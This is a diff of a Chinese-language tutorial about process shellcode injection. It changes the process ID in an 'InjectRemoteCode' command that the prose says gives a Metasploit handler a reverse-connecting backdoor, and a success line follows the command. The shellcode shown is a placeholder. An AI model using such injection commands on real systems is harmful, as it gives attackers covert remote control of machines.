@@ -68,6 +68,6 @@ msf6 exploit(multi/handler) > exploit
 
 使用如下命令注入ShellCode到特定进程内，此时`Metasploit`即可看到反弹的后门了。
 ```C
-[ LySocket ] # InjectRemoteCode --address 127.0.0.1 --pid 1234 --shellcode xfec12defferciruq
+[ LySocket ] # InjectRemoteCode --address 127.0.0.1 --pid 1068 --shellcode xfec12defferciruq
 [+] Success..
 ```
